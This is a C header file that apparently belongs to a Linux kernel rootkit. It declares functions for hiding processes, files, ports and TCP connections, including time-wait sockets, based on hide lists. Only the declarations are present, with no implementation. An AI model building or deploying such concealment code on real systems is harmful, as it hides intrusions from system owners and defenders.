#ifndef _HIDDEN_H
#define _HIDDEN_H

#include <net/sock.h>
#include <net/inet_timewait_sock.h>

#include <linux/stddef.h>

/* include */
#include "type.h"

//
bool hidden_proc(unsigned long pid, const char *name);

//
bool hidden_file(u64 ino, const char *name);

//
bool hidden_port(unsigned short port, const list_hidden_e list_hidden);

//
bool hidden_tcp_port(struct sock *sp,
                     const list_hidden_e lh_s,
                     const list_hidden_e lh_d);

//
bool hidden_tcp_timewait(struct inet_timewait_sock *tw,
                         const list_hidden_e lh_s,
                         const list_hidden_e lh_d);

#endif // _HIDDEN_H


